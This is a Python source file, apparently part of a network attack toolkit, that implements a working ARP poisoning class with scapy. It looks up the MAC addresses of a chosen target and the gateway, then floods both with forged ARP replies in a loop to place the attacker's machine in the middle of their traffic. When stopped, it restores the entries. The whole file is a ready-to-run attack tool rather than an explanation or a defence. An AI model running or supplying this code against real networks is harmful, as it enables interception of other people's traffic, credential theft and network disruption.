#arppoison.py

import time
import threading
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, conf as scapy_conf
import socket
import subprocess
import config as conf
from .progress import ARPProgressUpdater  # Importar o sistema de progresso

# ARP Poison Configuration
DEFAULT_DELAY = 1.0
DEFAULT_PACKET_COUNT = 0  # 0 = infinite
INTERFACE_AUTO_DETECT = True

class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=None, delay=1.0, packet_count=0, verbose=False):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface or self._get_default_interface()
        self.delay = delay
        self.packet_count = packet_count
        self.verbose = verbose
        self.poisoning = False
        self.packets_sent = 0
        self.start_time = None
        
        # Get MAC addresses
        self.target_mac = None
        self.gateway_mac = None
        self.attacker_mac = None
        
        # Progress updater
        self.progress_updater = None

    def _get_default_interface(self):
        try:
            return scapy_conf.iface
        except:
            return "eth0"

    def _get_mac_address(self, ip):
        try:
            if self.verbose:
                print(f"{conf.YELLOW}[*] Resolving MAC for {ip}...{conf.RESET}")
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered_list = srp(broadcast / arp_request, timeout=2, verbose=False)[0]
            if answered_list:
                mac = answered_list[0][1].hwsrc
                if self.verbose:
                    print(f"{conf.GREEN}[✓] {ip} -> {mac}{conf.RESET}")
                return mac
            else:
                print(f"{conf.RED}[!] Could not resolve MAC for {ip}{conf.RESET}")
                return None
        except Exception as e:
            print(f"{conf.RED}[!] Error resolving MAC for {ip}: {e}{conf.RESET}")
            return None

    def _get_gateway_ip(self):
        try:
            result = subprocess.run(['ip', 'route', 'show', 'default'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    return line.split()[2]
        except:
            pass
        return "192.168.1.1"

    def initialize(self):
        print(f"{conf.PURPLE}[*] Initializing ARP Poisoner...{conf.RESET}")
        print(f"{conf.PURPLE}[*] Interface: {self.interface}{conf.RESET}")

        try:
            self.attacker_mac = get_if_hwaddr(self.interface)
            print(f"{conf.GREEN}[✓] Attacker MAC: {self.attacker_mac}{conf.RESET}")
        except Exception as e:
            print(f"{conf.RED}[!] Could not get attacker MAC: {e}{conf.RESET}")
            return False

        if not self.gateway_ip:
            self.gateway_ip = self._get_gateway_ip()
            print(f"{conf.YELLOW}[*] Auto-detected gateway: {self.gateway_ip}{conf.RESET}")

        self.target_mac = self._get_mac_address(self.target_ip)
        if not self.target_mac:
            return False

        self.gateway_mac = self._get_mac_address(self.gateway_ip)
        if not self.gateway_mac:
            return False

        print(f"{conf.GREEN}[✓] Target: {self.target_ip} ({self.target_mac}){conf.RESET}")
        print(f"{conf.GREEN}[✓] Gateway: {self.gateway_ip} ({self.gateway_mac}){conf.RESET}")
        return True

    def _create_poison_packet(self, victim_ip, victim_mac, spoof_ip):
        return ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=self.attacker_mac)

    def _poison_loop(self):
        print(f"{conf.GREEN}[*] Starting ARP poisoning...{conf.RESET}")
        print(f"{conf.YELLOW}[*] Press Ctrl+C to stop{conf.RESET}")
        self.start_time = time.time()
        count = 0

        # Inicializar o progress updater
        self.progress_updater = ARPProgressUpdater(self)
        self.progress_updater.start()

        try:
            while self.poisoning:
                packet1 = self._create_poison_packet(self.target_ip, self.target_mac, self.gateway_ip)
                packet2 = self._create_poison_packet(self.gateway_ip, self.gateway_mac, self.target_ip)

                sendp(Ether(dst=self.target_mac)/packet1, iface=self.interface, verbose=False)
                sendp(Ether(dst=self.gateway_mac)/packet2, iface=self.interface, verbose=False)

                self.packets_sent += 2
                count += 1

                # Remover o print verbose daqui - agora é gerenciado pelo progress.py
                # if self.verbose:
                #     elapsed = time.time() - self.start_time
                #     print(f"{conf.CYAN}[*] Packets sent: {self.packets_sent} | Elapsed: {elapsed:.1f}s{conf.RESET}")

                if self.packet_count > 0 and count >= self.packet_count:
                    break

                time.sleep(self.delay)

        except KeyboardInterrupt:
            print(f"\n{conf.YELLOW}[*] Stopping ARP poisoning...{conf.RESET}")
        except Exception as e:
            print(f"{conf.RED}[!] Error during poisoning: {e}{conf.RESET}")
        finally:
            # Parar o progress updater
            if self.progress_updater:
                self.progress_updater.stop()

    def _restore_arp(self):
        print(f"{conf.YELLOW}[*] Restoring ARP entries...{conf.RESET}")
        try:
            restore_target = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                                 psrc=self.gateway_ip, hwsrc=self.gateway_mac)
            restore_gateway = ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                                  psrc=self.target_ip, hwsrc=self.target_mac)

            for _ in range(5):
                sendp(Ether(dst=self.target_mac)/restore_target, iface=self.interface, verbose=False)
                sendp(Ether(dst=self.gateway_mac)/restore_gateway, iface=self.interface, verbose=False)
                time.sleep(0.1)

            print(f"{conf.GREEN}[✓] ARP entries restored{conf.RESET}")
        except Exception as e:
            print(f"{conf.RED}[!] Error restoring ARP: {e}{conf.RESET}")

    def start_poisoning(self):
        if not self.initialize():
            print(f"{conf.RED}[!] Initialization failed{conf.RESET}")
            return False

        self.poisoning = True

        try:
            self._poison_loop()
        except KeyboardInterrupt:
            pass
        finally:
            self.poisoning = False
            self._restore_arp()

        duration = time.time() - self.start_time if self.start_time else 0

        return {
            "target_ip": self.target_ip,
            "gateway_ip": self.gateway_ip,
            "packets_sent": self.packets_sent,
            "duration": duration,
            "success": True
        }

    def stop_poisoning(self):
        self.poisoning = False
        if self.progress_updater:
            self.progress_updater.stop()